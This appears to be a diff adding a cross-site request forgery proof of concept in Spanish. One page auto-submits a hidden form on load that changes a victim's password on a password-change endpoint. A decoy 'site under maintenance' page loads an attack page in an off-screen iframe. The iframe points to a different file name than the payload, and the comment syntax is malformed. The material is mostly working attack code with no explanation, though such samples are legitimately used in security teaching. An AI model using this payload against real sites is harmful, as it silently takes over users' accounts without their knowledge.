@@ -1,0 +1,15 @@
+<--! expl.html -->
+<--! Request from domain or blog http://aplicacion.example.com/cambia_pwd.php -->
+<body onload="envia()">
+<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
+<input type="text" id="pwd" name="pwd" value="otra nueva">
+</form>
+<body>
+<script>
+function envia(){document.getElementById("formulario").submit();}
+</script>
+
+<!-- public.html -->
+<iframe src="2-1.html" style="position:absolute;top:-5000">
+</iframe>
+<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
